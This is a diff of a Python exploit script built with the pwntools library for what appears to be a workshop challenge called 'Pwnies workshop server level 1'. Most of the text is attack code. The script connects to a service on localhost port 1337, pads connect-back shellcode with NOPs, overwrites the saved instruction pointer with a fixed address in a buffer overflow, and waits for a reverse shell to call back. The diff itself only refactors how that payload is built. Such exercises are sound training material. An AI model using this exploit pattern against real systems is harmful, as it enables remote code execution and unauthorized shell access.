@@ -2,10 +2,7 @@
 
 # Pwnies workshop server level 1
 
-import sys, socket
-from pwn import *
-from pwn.i386 import nops
-context('i386', 'linux', 'ipv4')
+from pwn.classic import *
 
 log.waitfor('Counting to ten')
 for n in range(10):
@@ -17,10 +14,9 @@ sock = remote('localhost', 1337, timeout = 1)
 sock.recvuntil('Your output to my input? Do your best!\n')
 
 handler = handler(timeout = 1)
-shellcode = asm(connectback(sock.lhost, handler.port))
 
-eip = p32(0x0804a080)
-sock.send(nops(0xD4 - len(shellcode)) + shellcode + eip + '\n')
+eip = 0x0804a080
+sock.send(flat(nop_pad(0xd4, connectback(sock.lhost, handler.port), avoid = '\x00\r\n'), eip, '\n'))
 sock.close()
 
 handler.wait_for_connection()
